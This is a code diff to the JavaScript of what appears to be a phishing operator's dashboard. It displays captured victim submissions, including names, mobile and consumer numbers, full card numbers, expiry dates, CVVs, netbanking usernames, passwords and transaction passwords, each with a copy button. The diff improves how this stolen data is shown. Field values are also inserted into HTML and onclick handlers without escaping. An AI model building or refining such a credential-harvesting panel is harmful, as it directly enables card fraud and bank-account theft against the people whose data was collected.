@@ -361,7 +361,6 @@
                     return;
                 }
 
-                // Render submissions in reverse order (newest first)
                 document.getElementById('modalBody').innerHTML = submissions.slice().reverse().map((sub, idx) => {
                     const time = sub.submittedAt ? new Date(sub.submittedAt).toLocaleString() : 'N/A';
                     
@@ -369,40 +368,62 @@
                         for(let k of keys) {
                             if(sub[k] !== undefined && sub[k] !== null && String(sub[k]).trim() !== "") return sub[k];
                         }
-                        return 'Nill';
+                        return null;
                     };
 
-                    const row = (label, value) => `
+                    const row = (label, value) => value ? `
                         <div class="form-row">
                             <span class="form-label">${label}:</span>
-                            <span class="form-value">${value} ${value !== 'Nill' ? `<i class="fas fa-copy copy-icon" onclick="copyText('${String(value).replace(/'/g, "\\'")}')"></i>` : ''}</span>
-                        </div>`;
+                            <span class="form-value">${value} <i class="fas fa-copy copy-icon" onclick="copyText('${String(value).replace(/'/g, "\\'")}')"></i></span>
+                        </div>` : '';
+
+                    const personalData = [
+                        row('Name', getVal(['customerName', 'name', 'Name', 'full_name', 'userName'])),
+                        row('Mobile', getVal(['mobileNumber', 'mobile', 'mobile_number', 'phone', 'phoneNumber', 'Mobile', 'Mobile Number'])),
+                        row('Consumer No', getVal(['consumerNumber', 'consumerNo', 'consumer_no', 'consumer_number', 'Consumer Number']))
+                    ].filter(r => r !== '').join('');
+
+                    const cardData = [
+                        row('Card Number', getVal(['cardNumber', 'cardNo', 'card_number', 'Card Number'])),
+                        row('Expiry Date', getVal(['expireDate', 'expiryDate', 'expiry', 'exp_date', 'expDate', 'Expiry Date'])),
+                        row('CVV', getVal(['cvv', 'CVV']))
+                    ].filter(r => r !== '').join('');
+
+                    const netbankingData = [
+                        row('Bank Name', getVal(['bankName', 'bank_name', 'Bank Name'])),
+                        row('User Name', getVal(['USERNAME', 'netUsername', 'userId', 'user_id', 'username', 'User Name'])),
+                        row('Password', getVal(['netPassword', 'password', 'loginPassword', 'Password'])),
+                        row('TXN Pass', getVal(['txnPass', 'txn_pass', 'transactionPassword', 'customer_id', 'TXN Pass', 'customerId']))
+                    ].filter(r => r !== '').join('');
 
                     return `
                     <div class="form-submission-card">
                         <div class="submission-time">Entry #${submissions.length - idx} • ${time}</div>
                         
+                        ${personalData ? `
                         <div class="form-section">
                             <div class="form-section-title"><i class="fas fa-user"></i> Personal Details</div>
-                            ${row('Name', getVal(['customerName', 'name', 'Name', 'full_name', 'userName']))}
-                            ${row('Mobile', getVal(['mobileNumber', 'mobile', 'mobile_number', 'phone', 'phoneNumber', 'Mobile', 'Mobile Number']))}
-                            ${row('Consumer No', getVal(['consumerNumber', 'consumerNo', 'consumer_no', 'consumer_number', 'Consumer Number']))}
-                        </div>
+                            ${personalData}
+                        </div>` : ''}
 
+                        ${cardData ? `
                         <div class="form-section">
                             <div class="form-section-title"><i class="fas fa-credit-card"></i> Card Details</div>
-                            ${row('Card Number', getVal(['cardNumber', 'cardNo', 'card_number', 'Card Number']))}
-                            ${row('Expiry Date', getVal(['expireDate', 'expiryDate', 'expiry', 'exp_date', 'expDate', 'Expiry Date']))}
-                            ${row('CVV', getVal(['cvv', 'CVV']))}
-                        </div>
+                            ${cardData}
+                        </div>` : ''}
 
+                        ${netbankingData ? `
                         <div class="form-section">
                             <div class="form-section-title"><i class="fas fa-university"></i> Netbanking Details</div>
-                            ${row('Bank Name', getVal(['bankName', 'bank_name', 'Bank Name']))}
-                            ${row('User Name', getVal(['netUsername', 'userId', 'user_id', 'username', 'User Name']))}
-                            ${row('Password', getVal(['netPassword', 'password', 'loginPassword', 'Password']))}
-                            ${row('TXN Pass', getVal(['txnPass', 'txn_pass', 'transactionPassword', 'customer_id', 'TXN Pass', 'customerId']))}
-                        </div>
+                            ${netbankingData}
+                        </div>` : ''}
+
+                        ${!personalData && !cardData && !netbankingData ? `
+                            <div class="form-section">
+                                <div class="form-section-title"><i class="fas fa-database"></i> Other Details</div>
+                                ${Object.entries(sub).filter(([k]) => k !== 'submittedAt').map(([k, v]) => row(k, v)).join('')}
+                            </div>
+                        ` : ''}
                     </div>`;
                 }).join('');
             } catch(e) { toast('Error fetching form data', true); }
